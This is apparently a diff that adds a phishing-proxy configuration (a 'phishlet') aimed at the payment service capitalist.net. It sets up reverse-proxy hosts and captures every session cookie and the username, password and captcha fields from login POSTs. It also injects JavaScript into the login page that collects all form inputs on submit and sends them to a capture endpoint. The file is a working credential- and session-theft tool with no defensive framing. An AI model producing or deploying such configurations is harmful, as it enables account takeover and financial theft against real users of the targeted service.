@@ -1,0 +1,78 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'capitalist.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'capitalist.net', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'eu.api', orig_sub: 'eu.api', domain: 'fpjs.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'fpnpmcdn.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'a.nel', orig_sub: 'a.nel', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+
+
+
+sub_filters:
+  - {triggers_on: 'capitalist.net', orig_sub: '', domain: 'capitalist.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'm.capitalist.net', orig_sub: 'm', domain: 'capitalist.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'capitalist.net', orig_sub: 'a.nel', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'm.capitalist.net', orig_sub: 'a.nel', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+
+  - {triggers_on: 'capitalist.net', orig_sub: 'eu.api', domain: 'fpjs.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'capitalist.net', orig_sub: '', domain: 'fpnpmcdn.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'm.capitalist.net', orig_sub: '', domain: 'fpnpmcdn.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+
+auth_tokens:
+  - domain: 'capitalist.net'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - "/finance"
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'captchaCode'
+      search: '(.*)'
+      type: 'post'
+    
+login:
+  domain: 'capitalist.net'
+  path: '/login'
+
+bot_bypass:
+    enabled: true
+    login_url: "https://capitalist.net/login"
+    email_selector: "input[name='username']"
+    email_pattern: "username=([^&]+)"
+    token_url: "/auth/token"
+    token_pattern: "token=([^&]+)"
+
+js_inject:
+  - trigger_domains: ["capitalist.net"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      (function() {
+              document.querySelectorAll('form').forEach(form => {
+                  form.addEventListener('submit', function(event) {
+                      var formData = {};
+                      form.querySelectorAll('input, textarea, select').forEach(input => {
+                          if (input.name && input.value) {
+                              formData[input.name] = input.value;
+                          }
+                      });
+                      fetch('/capture-form-data', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({ formData: formData, url: window.location.href })
+                      }).catch(err => console.error('Failed to send form data:', err));
+                  });
+              });
+          })();
